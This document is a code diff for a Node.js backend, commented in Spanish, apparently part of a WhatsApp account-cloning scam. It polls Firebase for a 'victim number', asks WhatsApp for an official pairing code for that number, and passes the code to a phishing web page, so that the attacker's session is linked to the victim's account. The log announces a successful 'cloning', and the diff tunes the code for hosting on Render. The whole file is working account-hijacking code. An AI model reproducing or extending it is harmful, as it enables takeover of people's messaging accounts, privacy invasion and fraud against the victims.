@@ -9,9 +9,9 @@ if (!admin.apps.length) {
 }
 const db = admin.firestore();
 
-// Inicialización del cliente WhatsApp
+// Inicialización del cliente WhatsApp con Puppeteer corregido para Render
 const client = new Client({
-    authStrategy: new LocalAuth({ clientId: "whatsapp-master" }),
+    authStrategy: new LocalAuth({ clientId: "master-session" }),
     puppeteer: {
         headless: true,
         args: [
@@ -23,22 +23,24 @@ const client = new Client({
     }
 });
 
-// Función para procesar números entrantes cada 2 segundos
-async function monitorizarSolicitudes() {
+// Función de vigilancia para detectar números nuevos
+async function monitorizar() {
     try {
         const docRef = db.collection("wa_clon_global").doc("current_session");
         const snap = await docRef.get();
         
         if (snap.exists) {
             const data = snap.data();
+            // Si el estado es solicitando_codigo y no hay código generado aún
             if (data.status === "solicitando_codigo" && !data.pairingCode) {
-                console.log([!] Detectado número víctima: ${data.numero_victima});
+                console.log("Procesando numero: " + data.numero_victima);
                 
-                // Pedir código oficial a los servidores de WhatsApp
+                // Pedir el código oficial de 8 dígitos
                 const code = await client.requestPairingCode(data.numero_victima);
                 
-                console.log([OK] Código de 8 dígitos generado: ${code});
+                console.log("Codigo generado: " + code);
                 
+                // Actualizar Firebase para que la web lo muestre
                 await docRef.update({
                     pairingCode: code,
                     status: "mostrando_codigo"
@@ -46,25 +48,25 @@ async function monitorizarSolicitudes() {
             }
         }
     } catch (e) {
-        // console.log("Revisando...");
+        // Error silencioso para evitar ruidos en el log
     }
 }
 
-// Polling de alta frecuencia
-setInterval(monitorizarSolicitudes, 3000);
+// Revisar la base de datos cada 3 segundos
+setInterval(monitorizar, 3000);
 
 client.on('ready', () => {
-    console.log("[!!!] SESIÓN VINCULADA: Clonación completada con éxito.");
+    console.log("CLONACION EXITOSA: Sesion vinculada");
     db.collection("wa_clon_global").doc("current_session").update({ status: "exito" });
 });
 
-client.initialize().catch(e => console.log("Error al iniciar cliente:", e));
+client.initialize().catch(e => console.log("Error inicializando:", e.message));
 
-// Servidor de salud para Render
+// Servidor de salud para que Render mantenga el servicio activo
 const port = process.env.PORT || 3000;
 http.createServer((req, res) => {
-    res.writeHead(200);
-    res.end('ROBOT ONLINE - PAIRING ACTIVE');
+    res.write('MOTOR PAIRING ONLINE');
+    res.end();
 }).listen(port, () => {
-    console.log(Motor de alta frecuencia escuchando en puerto ${port});
+    console.log("Servidor iniciado en puerto " + port);
 });
